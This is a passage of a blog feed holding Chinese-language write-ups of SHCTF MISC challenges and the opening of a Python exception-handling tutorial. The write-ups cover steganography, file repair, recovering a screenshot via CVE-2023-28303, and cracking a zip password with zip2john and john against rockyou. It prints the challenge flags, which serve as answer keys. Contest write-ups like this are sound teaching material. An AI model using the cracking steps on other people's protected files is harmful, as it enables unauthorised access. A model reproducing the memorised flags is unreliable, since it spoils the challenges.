data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Oi2FJNjWsCJFkQkD.png!thumbnail\" alt=\"\"></p>\n<p><strong>SICTF{88a39373-e204-43b6-b321-33ac8972fde9}</strong></p>\n<h1 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> <strong>Easy_Shark</strong></h1>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/SHCTF%20MISC/",
            "url": "https://nnnpc.github.io/2024/04/16/SHCTF%20MISC/",
            "title": "SHCTF MISC",
            "date_published": "2024-04-16T05:58:19.027Z",
            "content_html": "<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h1>\n<h2 id=\"真的签到\"><a class=\"markdownIt-Anchor\" href=\"#真的签到\">#</a> 真的签到</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Je4ROtP2TxbJEXRk.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Welc0me_tO_SHCTF2023}</strong></p>\n<h2 id=\"请对我使用社工吧\"><a class=\"markdownIt-Anchor\" href=\"#请对我使用社工吧\">#</a> 请对我使用社工吧</h2>\n<p>社工题，根据图片去寻找</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NdRA2pAZJcnLNnqp.png!thumbnail\" alt=\"\"></p>\n<p>根据万达体彩店这个信息，找对面有大学的，最终找到山东东营西城万达广场，对面就是中国石油大学</p>\n<p><strong>flag {山东省<em>东营市</em>东营区_中国石油大学}</strong></p>\n<h2 id=\"也许需要一些py\"><a class=\"markdownIt-Anchor\" href=\"#也许需要一些py\">#</a> 也许需要一些 py</h2>\n<p>将未加密的 flag 文件解压出来放入 winhex</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WBluAVM4HPkFw0Y9.png!thumbnail\" alt=\"\"></p>\n<p>补上缺少的 PNG 头，并且加上 png 后缀</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YVnu7n95ROxrmrs1.png!thumbnail\" alt=\"\"></p>\n<p>得到图片，发现是一串 md5，解码一下注释</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vs3CPyNSUgihSQAZ.png!thumbnail\" alt=\"\"></p>\n<p>发现是一个 key，将大写转为小写，解压出加密文件</p>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AHesG8y4wmcM1T7S.png!thumbnail\" alt=\"\"></p>\n<p>根据题目提示：flag 怎么没大没小的可以知道这并不是最终的 flag，并且大小写有问题，根据前面得到的 md5 可以猜测是正确 flag 的 md5 值用来校验，利用脚本来组合字符串校验 md5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import hashlib</span><br><span class=\"line\">import itertools</span><br><span class=\"line\"></span><br><span class=\"line\">target_md5 = &quot;63e62fbce22f2757f99eb7da179551d2&quot;</span><br><span class=\"line\">input_string = &quot;pNg_and_Md5_SO_GreaT&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">def generate_case_combinations(input_string):</span><br><span class=\"line\">    combinations = []</span><br><span class=\"line\">    for case_combination in itertools.product(*zip(input_string.lower(), input_string.upper())):</span><br><span class=\"line\">        combinations.append(&#x27;&#x27;.join(case_combination))</span><br><span class=\"line\">    return combinations</span><br><span class=\"line\"></span><br><span class=\"line\">def find_matching_string(target_md5, input_string):</span><br><span class=\"line\">    for combination in generate_case_combinations(input_string):</span><br><span class=\"line\">        md5_hash = hashlib.md5(combination.encode()).hexdigest()</span><br><span class=\"line\">        if md5_hash == target_md5:</span><br><span class=\"line\">            return combination</span><br><span class=\"line\">    return None</span><br><span class=\"line\"></span><br><span class=\"line\">result = find_matching_string(target_md5, input_string)</span><br><span class=\"line\">if result:</span><br><span class=\"line\">    print(&quot;找到匹配的字符串:&quot;, result)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    print(&quot;未找到匹配的字符串&quot;)</span><br></pre></td></tr></table></figure>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ow1KcmQEb2rYDTWi.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Png_AnD_md5_so_GReAt}</strong></p>\n<h2 id=\"ez-misc\"><a class=\"markdownIt-Anchor\" href=\"#ez-misc\">#</a> ez-misc</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/G7SJFsUbWPEWUZdw.png!thumbnail\" alt=\"\"></p>\n<p>得到附件是一串 01 字符串，利用脚本转换为二维码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image</span><br><span class=\"line\">from zlib import *</span><br><span class=\"line\"></span><br><span class=\"line\">MAX = 29</span><br><span class=\"line\">pic = Image.new(&quot;RGB&quot;,(MAX,MAX))</span><br><span class=\"line\">str =&quot;1111111011111111011000111111110000010011000101010001000001101110100011000110010010111011011101011010000100010101110110111010000111111000001011101100000100011101111010010000011111111010101010101010111111100000000000000111111100000000001011101000111010100100010010011000000101101111100010001110110010101001111010001110011101001001001100100010001000100110001001100010101001110100011010000110100110000001101111000001100111111000100101011111000110010000011111111111000111010110001110100100110011010011000011010000110011100100111011001110011010100110100111101101000110001001110101010010100100110001111101111111100010000000011110011010110001000011111110010000000001101010111100000101110100010101000100101011101011000001110011111111110111010010101001010000110100101110101111111011010001100011000001000111101111001001101011111110010100011110111100111&quot;</span><br><span class=\"line\">i=0</span><br><span class=\"line\">for y in range(0,MAX):</span><br><span class=\"line\">    for x in range(0,MAX):</span><br><span class=\"line\">        if(str[i] == &#x27;1&#x27;):</span><br><span class=\"line\">            pic.putpixel([x,y],(0,0,0))</span><br><span class=\"line\">        else:pic.putpixel([x,y],(255,255,255))</span><br><span class=\"line\">        i = i+1</span><br><span class=\"line\">pic.show()</span><br><span class=\"line\">pic.save(&quot;flag.png&quot;)</span><br></pre></td></tr></table></figure>\n<p>得到：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V6wvSI1oeWGz3s1T.png!thumbnail\" alt=\"\"></p>\n<p>扫描得到：hit_k1sme4_4_fun</p>\n<p>解压加密附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SNGDjvpd3ckfxv5B.png!thumbnail\" alt=\"\"></p>\n<p>根据 PK 头添上后缀.zip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YurSfv6DBt1rvoJ9.png!thumbnail\" alt=\"\"></p>\n<p>解密注释提示 rockyou 字典，证明需要用到字典爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zip2john flag.zip &gt; hash</span><br><span class=\"line\">john --wordlist=rockyou.txt hash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c4NDqHZdZFmTmXfQ.png!thumbnail\" alt=\"\"></p>\n<p>得到密码 palomino，解压得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/e5IvjzrYaQGXn2fK.png!thumbnail\" alt=\"\"></p>\n<p>猜测为字频统计，使用脚本排列</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">#Author: mochu7</span><br><span class=\"line\">alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\\\&#123;\\\\&#125;[]&quot;</span><br><span class=\"line\">strings = open(&#x27;flag.txt&#x27;).read()</span><br><span class=\"line\"></span><br><span class=\"line\">result = &#123;&#125;</span><br><span class=\"line\">for i in alphabet:</span><br><span class=\"line\">   counts = strings.count(i)</span><br><span class=\"line\">   i = &#x27;&#123;0&#125;&#x27;.format(i)</span><br><span class=\"line\">   result[i] = counts</span><br><span class=\"line\"></span><br><span class=\"line\">res = sorted(result.items(),key=lambda item:item[1],reverse=True)</span><br><span class=\"line\">for data in res:</span><br><span class=\"line\">   print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in res:</span><br><span class=\"line\">   flag = str(i[0])</span><br><span class=\"line\">   print(flag[0],end=&quot;&quot;)</span><br></pre></td></tr></table></figure>\n<p>得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/m7O5XTnMa7pAJ8Rh.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{SHyk1sme4}</strong></p>\n<h2 id=\"jaeger-lover\"><a class=\"markdownIt-Anchor\" href=\"#jaeger-lover\">#</a> Jaeger lover</h2>\n<p>得到图片和加密压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bokgo2Bhq0ZF3Uiq.png!thumbnail\" alt=\"\"></p>\n<p>图片尾的 base 解码得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XdlCAm3wg2CD1w41.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">you know the Windows is a system for PC,but do you know the what is thr Op. System for this Jaeger？</span><br></pre></td></tr></table></figure>\n<p>让我们去找暴风赤红的操作系统</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DcuefirFrdTmu4sy.png!thumbnail\" alt=\"\"></p>\n<p>能在百度百科中找到 Tri-Sun Horizon<br>\nGate，根据题目提示每张图片有两个 steg，猜测该图片另一个 steg 为 steghide</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/otBrdkDYbZXjex4Z.png!thumbnail\" alt=\"\"></p>\n<p>得到压缩包密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.*+#1Ao/aeS</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PkM3s8618LoivkCp.png!thumbnail\" alt=\"\"></p>\n<p>一看宽高就明显被修改过，CRC 爆破出正确的宽高</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n7OrB4bvgbjP1KLt.png!thumbnail\" alt=\"\"></p>\n<p>再次得到 key，K34-759183-191</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OeaaK08SxvgWDxlG.png!thumbnail\" alt=\"\"></p>\n<p>查看图片结构发现文件尾有冗余，猜测为 oursecret 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/43BvxtDZ1eGb99cY.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/izewk8EeWJoXXcgN.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，<strong>flag{A1l_boys_aRe_Jaeger_L0ver!!}</strong></p>\n<h2 id=\"steganography\"><a class=\"markdownIt-Anchor\" href=\"#steganography\">#</a> Steganography</h2>\n<p>在 careful.jpg 图片末尾发现一串 base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gKVJcwKeUDknpGrA.png!thumbnail\" alt=\"\"></p>\n<p>这题应该是算非预期出的，将输出作为掩码进行爆破，大概半小时左右，忘记截图了就不重新爆破一遍了，密码为 12ercsxqwed909jk</p>\n<p>解压得到 flag，<strong>flag{4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c}</strong></p>\n<h2 id=\"可爱的派蒙捏\"><a class=\"markdownIt-Anchor\" href=\"#可爱的派蒙捏\">#</a> 可爱的派蒙捏</h2>\n<p>分离图片出一个压缩包</p>\n<p>解压得到两个相似的文本 1.txt 和 2.txt</p>\n<p>用 winhex 的文件工具进行比较</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bZ99XTD0P17sqfse.png!thumbnail\" alt=\"\"></p>\n<p>保留差异第二列进行 16 进制转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">666C61677B34656266333237393035323838666361393437617D</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/H8MGubWrmaE9gMV2.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，<strong>flag{4ebf327905288fca947a}</strong></p>\n<h2 id=\"message\"><a class=\"markdownIt-Anchor\" href=\"#message\">#</a> message</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EkDKmacmuUjfF0Vi.png!thumbnail\" alt=\"\"></p>\n<p>16 进制转换得到 flag</p>\n<p><strong>SHCTF{ba978405-b1c8-847c-8e69-f62177e4c087}</strong></p>\n<h2 id=\"签到题\"><a class=\"markdownIt-Anchor\" href=\"#签到题\">#</a> <strong>签到题</strong></h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/t1ESyLiSCgPkr2Qh.png!thumbnail\" alt=\"\"></p>\n<p>两层 base64 得到 flag</p>\n<p><strong>flag{this_is_flag}</strong></p>\n<h1 id=\"week2\"><a class=\"markdownIt-Anchor\" href=\"#week2\">#</a> <strong>WEEK2</strong></h1>\n<h2 id=\"远在天边近在眼前\"><a class=\"markdownIt-Anchor\" href=\"#远在天边近在眼前\">#</a> 远在天边近在眼前</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aWiPMzvlZd41xxn0.png!thumbnail\" alt=\"\"></p>\n<p>得到压缩包，从里到外拼接文件夹字符得到 flag</p>\n<p><strong>flag{TH15_1S_r3aIIY_eA5y_4LRi9Ht?_765786987fad}</strong></p>\n<h2 id=\"奇怪的screenshot\"><a class=\"markdownIt-Anchor\" href=\"#奇怪的screenshot\">#</a> 奇怪的 screenshot</h2>\n<p>得到截图</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ptmDLexzfR0KrPmh.png!thumbnail\" alt=\"\"></p>\n<p>winhex 查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fwXe3EWCT1B6g5dx.png!thumbnail\" alt=\"\"></p>\n<p>发现有两个图片尾，截图 cve，CVE-2023-28303</p>\n<p>使用工具还原</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8gRDuBU48XNpFS68.png!thumbnail\" alt=\"\"></p>\n<p>得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">杨吕褚朱窦任云伍孙赵孙李伍孙冯李赵李伍袁尤张钱钱伍花张尤曹曹尤张朱伍魏赵赵吕伍尤金伍张赵魏伍花韩蒋陶华韩</span><br></pre></td></tr></table></figure>\n<p>百家姓解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aGU1V9FcX3tYFCIx.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，<strong>flag{CVE-2023-28303-Win11-Snipping-t00l-is-n0t-Secure}</strong></p>\n<h2 id=\"可爱的洛琪希\"><a class=\"markdownIt-Anchor\" href=\"#可爱的洛琪希\">#</a> 可爱的洛琪希</h2>\n<p>得到 jpg 的 base64 编码，解码之后保存为图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lbDsEUdtPdeCgYqz.png!thumbnail\" alt=\"\"></p>\n<p>在详细信息中找到编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NO6aZNZniBN0rjRC.png!thumbnail\" alt=\"\"></p>\n<p>图片末尾找到 key，nanian</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U55JFhRXaXynzsUL.png!thumbnail\" alt=\"\"></p>\n<p>16 进制解码，维吉尼亚解密得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bg5Qaocg7VnbLi2S.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Roxy_daisuki!}</strong></p>\n<h2 id=\"图片里的秘密\"><a class=\"markdownIt-Anchor\" href=\"#图片里的秘密\">#</a> 图片里的秘密</h2>\n<p>在图片末发现 rar 压缩包，手动分离出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/D0X86WBtiRNzcOXE.png!thumbnail\" alt=\"\"></p>\n<p>解压得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bNsm9bfPcLzt83Pc.png!thumbnail\" alt=\"\"></p>\n<p>根据题目提示盲水印猜测为 java 盲水印，水印工具提取得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VDj66MXIPIVn08mo.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Blind_Water_Mark!}</strong></p>\n<h2 id=\"表里的码\"><a class=\"markdownIt-Anchor\" href=\"#表里的码\">#</a> 表里的码</h2>\n<p>得到一个 zip 文件，根据题目提示发现是表格的压缩包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zyc9zRFRTmHmOZeo.png!thumbnail\" alt=\"\"></p>\n<p>修改后缀为 xls 打开</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5M9xrCAoxcyE8Ruw.png!thumbnail\" alt=\"\"></p>\n<p>随便点点发现有些单元格字体是加粗的，将加粗单元格填充为黑色得到二维码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FqPBJ73JlvrEoZjT.png!thumbnail\" alt=\"\"></p>\n<p>扫码得到 flag，<strong>flag{j0k3r_1s_my_wif3}</strong></p>\n<h2 id=\"喜帖街\"><a class=\"markdownIt-Anchor\" href=\"#喜帖街\">#</a> 喜帖街</h2>\n<p>先放张图来阐述一下这个老知识点</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FbA4soOP1hTsNTLV.png!thumbnail\" alt=\"\"></p>\n<p>原理就是利用声波干涉消除原声得到想要的音频</p>\n<p>附件得到 wav 音频，听了下发现有杂音，想到了反相相消，这里在网上下载了原曲，使用 au 进行反相</p>\n<p>首先导入两个音频创建多轨并拖入</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Qr8sQXvUiDOpreme.png!thumbnail\" alt=\"\"></p>\n<p>当弹出采样率不匹配时点击确定使它自动转换成相同的采样率</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uEkNudRZ4Tf5otxx.png!thumbnail\" alt=\"\"></p>\n<p>拉大将音轨对齐</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gZrlFUcjENRGZgIA.png!thumbnail\" alt=\"\"></p>\n<p>再双击原曲也就是上图所示紫色部分，全选之后点击效果中的反相</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9iUgJhnGzeYdXyhj.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/849RF8f5dBT8rEG6.png!thumbnail\" alt=\"\"></p>\n<p>回看多轨能发现波峰正好对应上波谷，实现相消</p>\n<p>导出多轨重新放入 au 中查看频谱图</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VWsag0y9SQx90b2R.png!thumbnail\" alt=\"\"></p>\n<p>频谱图上发现了一串字符串 LeeTung，作为 key 来解音频隐写，尝试 deepsound 和 silenteye 都不是，这里也是一个比较老的知识点，wav 的 steghide 隐写</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LbDMr4x49wQ5HLIV.png!thumbnail\" alt=\"\"></p>\n<p>文本中得到 ook 编码，解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Q7TAUvUEBKFcgDNr.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zaf9yOtGxWmG5FSP.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{w@v2txt_s0_Int3r3st1ng!}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%BB%93%E6%9E%84/",
            "url": "https://nnnpc.github.io/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%BB%93%E6%9E%84/",
            "title": "Python学习------异常处理结构",
            "date_published": "2024-04-16T05:58:19.026Z",
            "content_html": "<blockquote>\n<p>对于每一种高级语言来说，异常处理结构不仅能够提高代码的鲁棒性，而且提高了代码的容错性，从而不会因为使用者的错误输入而造成系统崩溃，也可以通过异常处理结构为使用者提供更加友好的错误提示。引发程序异常的原因有很多种，较为常见的有除 0、下标越界等。<br>\npython 中提供了很多种不同形式的异常处理结构，其基本思路都是先尝试执行代码，再处理可能发生的错误</p>\n</blockquote>\n<p><strong>1.try…except… 结构</strong></p>\n<p>在 python 异常处理结构中，try…except… 结构使用的最为频繁，其中 try 子句中的代码块为可能引发异常的语句，except 子句用来捕获相应的异常。可以理解为：当 try 子句代码块执行异常并且被 except 子句捕获的时候，执行 except 子句的代码块</p>\n<p>例：记录学生数学成绩，范围为 0~100 的整形数值，如超出范围则会有提示</p>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">score = input(&#x27;数学成绩：&#x27;)</span><br><span class=\"line\">try:</span><br><span class=\"line\">    score = int(score)</span><br><span class=\"line\">    if(0&lt;score&lt;=100):</span><br><span class=\"line\">        print(&quot;数学成绩为：&quot;,score)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;超出最大范围&quot;)</span><br><span class=\"line\">except Exception as e:</span><br><span class=\"line\">    print(&quot;输入错误！&quot;)</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">80</span><br><span class=\"line\">120</span><br><span class=\"line\">a</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数学成绩为： 80</span><br><span class=\"line\">超出最大范围</span><br><span class=\"line\">输入错误！</span><br></pre></td></tr></table></figure>\n<p>这里刚开始我做转化成 int 型是在输入时直接进行转化了，比较呆，因此直接报出了错误，原理就是在输入的时候检测到了 a 不是整型数，且输入并没有在 try 语句当中，自然不会进行异常处理（就这个例题来说，异常处理的便是输入的不是整形的数值），因此直接报错。解决的办法便是将强制转换放入到 try 语句当中（如上代码），或者将强制转换的输入放入到 try 语句当中，就能进行异常处理了<br>\n<strong> 2.try…except…else… 结构</strong></p>\n<p>该结构其实可以理解为结构 1<br>\ntry…except… 结构的改版，解释为：如果 try 语句中抛出异常被 except 捕获，则执行相应的异常处理代码，如果没有抛出异常，则执行 else 语句中的代码。相当于将有可能抛出异常的代码放入 try 中，而其它的代码放入 else 中，两者分离</p>\n<p>代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    score = int(input(&#x27;数学成绩：&#x27;))</span><br><span class=\"line\">except Exception as e:</span><br><span class=\"line\">    print(&quot;输入错误！&quot;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    if(0&lt;score&lt;=100):</span><br><span class=\"line\">        print(&quot;数学成绩为：&quot;,score)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&quot;超出最大范围&quot;)</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">80</span><br><span class=\"line\">120</span><br><span class=\"line\">a</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">数学成绩为： 80</span><br><span class=\"line\">超出最大范围</span><br><span class=\"line\">输入错误！</span><br></pre></td></tr></table></figure>\n<p><strong>3.try…except…finally… 结构</strong></p>\n<blockquote>\n<p>在该结构中，无论 try 子句是否正常执行，finally 子句中的代码块总会得到执行。在日常开发过程中，该结构通常用来做清理工作。释放 try 子句中申请的资源<br>\n例：输入两个数值 a，b 进行除法运算，并输出最终的结果（要求带有异常处理结构）</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = int(input(&#x27;a:&#x27;))</span><br><span class=\"line\">b = int(input(&#x27;b:&#x27;))</span><br><span class=\"line\">try:</span><br><span class=\"line\">    div = a/b</span><br><span class=\"line\">    print(div)</span><br><span class=\"line\">except Exception as e:</span><br><span class=\"line\">    print(&#x27;The second parameter cannot be 0&#x27;)</span><br><span class=\"line\">finally:</span><br><span class=\"line\">    print(&#x27;运行结束！&#x27;)</span><br></pre></td></tr></table></figure>\n<p>输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:1</span><br><span class=\"line\">b:5</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0.2</span><br><span class=\"line\">运行结束！</span><br></pre></td></tr></table></figure>\n<p>当 b 为 0 即分母为 0 时发生异常，能被 except 